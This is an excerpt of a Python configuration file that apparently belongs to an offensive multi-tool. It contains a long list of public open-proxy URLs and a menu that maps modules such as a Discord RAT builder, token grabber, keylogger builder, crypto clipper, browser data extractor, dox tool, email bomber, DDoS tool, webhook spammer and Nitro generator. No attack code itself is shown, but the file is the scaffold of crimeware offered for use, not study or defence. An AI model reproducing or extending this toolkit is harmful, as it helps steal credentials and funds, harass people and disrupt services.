...
PROXY_SOURCES = [
    ...
    ('roosterkid HTTP', 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt'),
    ('roosterkid HTTPS', 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt'),
    ('roosterkid SOCKS4', 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt'),
    ('roosterkid SOCKS5', 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt'),
    ('sunny9577 HTTP', 'https://raw.githubusercontent.com/sunny9577/proxy-list/master/generated/http.txt'),
    ('sunny9577 HTTPS', 'https://raw.githubusercontent.com/sunny9577/proxy-list/master/generated/https.txt'),
    ('sunny9577 SOCKS4', 'https://raw.githubusercontent.com/sunny9577/proxy-list/master/generated/socks4.txt'),
    ('sunny9577 SOCKS5', 'https://raw.githubusercontent.com/sunny9577/proxy-list/master/generated/socks5.txt'),
    ('officialputuid HTTP', 'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/Http/Http.txt'),
    ('officialputuid HTTPS', 'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/Https/Https.txt'),
    ('officialputuid SOCKS4', 'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/Socks4/Socks4.txt'),
    ('officialputuid SOCKS5', 'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/Socks5/Socks5.txt'),
    ('obfdb HTTP', 'https://raw.githubusercontent.com/obfdb/proxy/main/http.txt'),
    ('obfdb HTTPS', 'https://raw.githubusercontent.com/obfdb/proxy/main/https.txt'),
    ('obfdb SOCKS4', 'https://raw.githubusercontent.com/obfdb/proxy/main/socks4.txt'),
    ('obfdb SOCKS5', 'https://raw.githubusercontent.com/obfdb/proxy/main/socks5.txt'),
    ('ErcinDedeworken HTTP', 'https://raw.githubusercontent.com/ErcinDedeworken/proxy-list/main/http.txt'),
    ('ErcinDedeworken HTTPS', 'https://raw.githubusercontent.com/ErcinDedeworken/proxy-list/main/https.txt'),
    ('ErcinDedeworken SOCKS4', 'https://raw.githubusercontent.com/ErcinDedeworken/proxy-list/main/socks4.txt'),
    ('ErcinDedeworken SOCKS5', 'https://raw.githubusercontent.com/ErcinDedeworken/proxy-list/main/socks5.txt'),
    ('ErcinDedeworken All', 'https://raw.githubusercontent.com/ErcinDedeworken/proxy-list/main/all.txt'),
    ('coderstrs HTTP', 'https://raw.githubusercontent.com/coderstrs/httpproxy/main/proxies.txt'),
    ('cyclic-revolution HTTP', 'https://raw.githubusercontent.com/cyclic-revolution/http-proxy/main/http_proxies.txt'),
    ('proxy4parsing HTTP', 'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt'),
    ('proxy4parsing HTTPS', 'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/https.txt'),
    ('proxy4parsing SOCKS4', 'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/socks4.txt'),
    ('proxy4parsing SOCKS5', 'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/socks5.txt'),
    ('RX4400 HTTP', 'https://raw.githubusercontent.com/RX4400/proxy-list/main/https.txt'),
    ('ermaozi HTTP', 'https://raw.githubusercontent.com/ermaozi/get_proxy/main/http.txt'),
    ('ermaozi SOCKS5', 'https://raw.githubusercontent.com/ermaozi/get_proxy/main/socks5.txt'),
    ('a2u HTTP', 'https://raw.githubusercontent.com/a2u/free-proxy-list/master/proxy-list/http.txt'),
    ('a2u SOCKS4', 'https://raw.githubusercontent.com/a2u/free-proxy-list/master/proxy-list/socks4.txt'),
    ('a2u SOCKS5', 'https://raw.githubusercontent.com/a2u/free-proxy-list/master/proxy-list/socks5.txt'),
    ('fourjr HTTP', 'https://raw.githubusercontent.com/fourjr/proxy-list/master/http.txt'),
    ('fourjr HTTPS', 'https://raw.githubusercontent.com/fourjr/proxy-list/master/https.txt'),
    ('fourjr SOCKS5', 'https://raw.githubusercontent.com/fourjr/proxy-list/master/socks5.txt'),
    ('kangproxies HTTP', 'https://raw.githubusercontent.com/ArifZeng/http-proxy/master/data/http.txt'),
    ('ArifZeng HTTPS', 'https://raw.githubusercontent.com/ArifZeng/https-proxy/master/data/https.txt'),
    ('mogria SOCKS4', 'https://raw.githubusercontent.com/mogria/proxy-list/master/socks4.txt'),
    ('mogria SOCKS5', 'https://raw.githubusercontent.com/mogria/proxy-list/master/socks5.txt'),
    ('miyachich HTTP', 'https://raw.githubusercontent.com/miyachich/free-proxy/master/http.txt'),
    ('monosans extra HTTP', 'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'),
    ('monosans extra SOCKS5', 'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt'),
    ('htr495 HTTP', 'https://raw.githubusercontent.com/htr495/free-proxy-list/main/http.txt'),
    ('htr495 HTTPS', 'https://raw.githubusercontent.com/htr495/free-proxy-list/main/https.txt'),
    ('zeyad2002 HTTP', 'https://raw.githubusercontent.com/zeyad2002/Free-Proxy/main/http.txt'),
    ('zeyad2002 HTTPS', 'https://raw.githubusercontent.com/zeyad2002/Free-Proxy/main/https.txt'),
    ('yihuacker HTTP', 'https://raw.githubusercontent.com/yihuacker/free-proxy/master/http.txt'),
    ('yihuacker HTTPS', 'https://raw.githubusercontent.com/yihuacker/free-proxy/master/https.txt'),
    ('zencodex HTTP', 'https://raw.githubusercontent.com/zencodex/free-proxy-list/main/http.txt'),
    ('zencodex HTTPS', 'https://raw.githubusercontent.com/zencodex/free-proxy-list/main/https.txt'),
    ('zencodex SOCKS5', 'https://raw.githubusercontent.com/zencodex/free-proxy-list/main/socks5.txt'),
    ('Berihlat HTTP', 'https://raw.githubusercontent.com/Berihlat/free-proxy-list/main/http.txt'),
    ('Berihlat HTTPS', 'https://raw.githubusercontent.com/Berihlat/free-proxy-list/main/https.txt'),
    ('ChrisHYCH HTTP', 'https://raw.githubusercontent.com/ChrisHYCH/Free-Proxy-List/main/http.txt'),
    ('ChrisHYCH HTTPS', 'https://raw.githubusercontent.com/ChrisHYCH/Free-Proxy-List/main/https.txt'),
    ('fate0 proxyscan', 'https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list'),
    ('tokenstock HTTP', 'https://raw.githubusercontent.com/tokenstock/free-proxy/master/http.txt'),
    ('TheSpeedX2 HTTP', 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'),
    ('MuRongPIG HTTP', 'https://raw.githubusercontent.com/MuRongPIG/proxy/main/http.txt'),
    ('MuRongPIG HTTPS', 'https://raw.githubusercontent.com/MuRongPIG/proxy/main/https.txt'),
    ('MuRongPIG SOCKS5', 'https://raw.githubusercontent.com/MuRongPIG/proxy/main/socks5.txt'),
    ('cverdes HTTP', 'https://raw.githubusercontent.com/cverdes/proxy-list/main/http.txt'),
    ('cverdes HTTPS', 'https://raw.githubusercontent.com/cverdes/proxy-list/main/https.txt'),
    ('aspanka HTTP', 'https://raw.githubusercontent.com/aspanka/free_proxy_list/main/proxy/http.txt'),
    ('aspanka HTTPS', 'https://raw.githubusercontent.com/aspanka/free_proxy_list/main/proxy/https.txt'),
    ('mikzsp HTTP', 'https://raw.githubusercontent.com/mikzsp/proxy-list/main/http.txt'),
    ('zenxenex HTTP', 'https://raw.githubusercontent.com/zenxenex/Free-Proxy-List/master/http.txt'),
    ('yuandagex HTTP', 'https://raw.githubusercontent.com/yuandagex/Free-Proxy/master/http.txt'),
    ('colatiger HTTP', 'https://raw.githubusercontent.com/colatiger/v2ray-nodes/master/proxy/http.txt'),
    ('VoltAir HTTP', 'https://raw.githubusercontent.com/VoltAir/Free-Proxy-List/master/http.txt'),
    ('VoltAir HTTPS', 'https://raw.githubusercontent.com/VoltAir/Free-Proxy-List/master/https.txt'),
    ('VoltAir SOCKS5', 'https://raw.githubusercontent.com/VoltAir/Free-Proxy-List/master/socks5.txt'),
    ('LALIDADA HTTP', 'https://raw.githubusercontent.com/LALIDADA/Free-Proxy-Http/main/proxy.txt'),
    ('xorta23 HTTP', 'https://raw.githubusercontent.com/xorta23/Free_Proxy_List/main/http_proxies.txt'),
    ('xorta23 HTTPS', 'https://raw.githubusercontent.com/xorta23/Free_Proxy_List/main/https_proxies.txt'),
    ('xorta23 SOCKS4', 'https://raw.githubusercontent.com/xorta23/Free_Proxy_List/main/socks4_proxies.txt'),
    ('xorta23 SOCKS5', 'https://raw.githubusercontent.com/xorta23/Free_Proxy_List/main/socks5_proxies.txt'),
]
...
MENU_TABS = [
    {"n": 1, "short": "DISCORD", "title": "DISCORD OPERATIONS", "icon": "📡",
     "tools": [('Discord Webhook Info', 'View webhook details'), ('Discord Token', 'Decode Discord tokens'),
               ...
               ('Webhook Spammer', 'Spam webhooks with messages'),
               ('Token Nuker', 'Token operations & info'),
               ('Onliner', 'Keep account online'),
               ('Nitro Generator', 'Generate Nitro codes'),
               ('Server Cloner', 'Clone server channels'),
               ('DM Logger', 'Export DM messages'),
               ('Nitro Snipe', 'Monitor for Nitro drops'),
               ('Webhook Deployer', 'Create/test/manage webhooks')],
     "mapped": [('discord_ops', 'webhook_info'), ('discord_ops', 'token_decode'),
                ...
                ('discord_ops', 'webhook_spammer'), ('discord_ops', 'token_nuker'),
                ('discord_ops', 'onliner'), ('discord_ops', 'nitro_gen'),
                ('discord_ops', 'server_cloner'), ('discord_ops', 'selfbot_dm_log'),
                ('discord_ops', 'selfbot_nitro_snipe'),
                ('webhook_deployer', 'run')]},
    {"n": 2, "short": "OSINT", "title": "OSINT & INTELLIGENCE", "icon": "🔍",
     "tools": [('Whois Lookup', 'Domain registration info'), ('DNS Resolver', 'A/MX/TXT/CNAME/NS records'),
               ...
               ('Phone Lookup', 'Phone number OSINT'),
               ('IP Grabber', 'Create IP grabber links'),
               ('GitHub Dorker', 'Search for exposed secrets')],
     "mapped": [('osint', 'whois_lookup'), ('osint', 'dns_resolver'), ('osint', 'ip_info'),
                ...
                ('phone_lookup', 'run'), ('ip_grabber', 'run'),
                ('github_dorker', 'run')]},
    {"n": 3, "short": "SECURITY", "title": "SECURITY & UTILITIES", "icon": "🛡️",
     "tools": [('Obfuscator V3', 'Multi-Layer XOR/B64 + AST Mangle'), ('Web Cloner', 'Clone websites locally'),
               ...
               ('Hash Cracker', 'Hash ID + wordlist crack'), ('VirusTotal', 'Scan files/URLs for malware')],
     "mapped": [('obfuscator', 'run'), ('web_cloner', 'run'), ('crypto', 'run'), ('qr_gen', 'run'),
                ...
                ('hash_cracker', 'run'), ('virus_total', 'run')]},
    {"n": 4, "short": "MALWARE", "title": "MALWARE & BUILDERS", "icon": "☠️",
     "tools": [('Discord RAT', 'Discord webhook RAT builder'),
               ('Token Grabber', 'Build token grabber .exe'),
               ('Keylogger Builder', 'Live keylogger + builder'),
               ('Crypto Clipper', 'Clipboard monitor & swapper'),
               ('Recovery Tool', 'Browser data extraction'),
               ('HWID Spoofer', 'Spoof HWID with backup/restore'),
               ...
               ('App Decrypter', 'Decrypt/rebuild .exe .dll .so'),
               ('Offset Dumper', 'Hex view + search + PE/ELF sections')],
     "mapped": [('discord_rat', 'run'), ('token_grabber', 'run'),
                ('keylogger', 'run'), ('crypto_clipper', 'run'),
                ('recovery_tool', 'run'), ('hwid_spoofer', 'run'),
                ('sql_scanner', 'run'), ('dox_tool', 'run'),
                ('email_bomber', 'run'), ('ddos_tool', 'run'),
                ('app_decrypter', 'run'), ('offset_dumper', 'run')]},
    {"n": 5, "short": "WEB", "title": "WEB & NETWORK TOOLS", "icon": "🌐",
     ...
     "mapped": [('web_cloner', 'run'), ('site_viewer', 'run'), ('web_search', 'run'),
                ...
                ('guns_viewbot', 'run')]},
    {"n": 6, "short": "TEXT", "title": "TEXT & ENCODING", "icon": "📝",
    ...
    {"n": 7, "short": "COLOR", "title": "COLOR & DESIGN", "icon": "🎨",
    ...
    {"n": 8, "short": "DATA", "title": "DATA & CONVERSION", "icon": "💾",
...
{"n": 9, "short": "ROBLOX", "title": "ROBLOX GAME SUITE", "icon": "🎮",
    ...
    {"n": 10, "short": "SIM", "title": "SIMULATION & GENERATORS", "icon": "🎭",
    ...
    {"n": 11, "short": "NET", "title": "NETWORK & DNS", "icon": "📡",
     "tools": [('Port Scanner', 'TCP port scan + banners'), ('Traceroute', 'Network path trace'),
               ...
               ('Subnet List', 'Enumerate CIDR range'), ('WiFi Scanner', 'Saved WiFi + passwords')],
     "mapped": [('port_scanner', 'run'), ('traceroute', 'run'), ('osint', 'dns_resolver'),
                ...
                ('misc_tools', 'subnet_list_gen'), ('wifi_scanner', 'run')]},
    {"n": 12, "short": "DEV", "title": "DEVELOPER TOOLS", "icon": "🔧",
    ...
    {"n": 13, "short": "FILE", "title": "FILE & IMAGE TOOLS", "icon": "📁",
    ...
    {"n": 14, "short": "SETTINGS", "title": "THEMES & SETTINGS", "icon": "⚙️",
     "tools": [], "mapped": []},
]
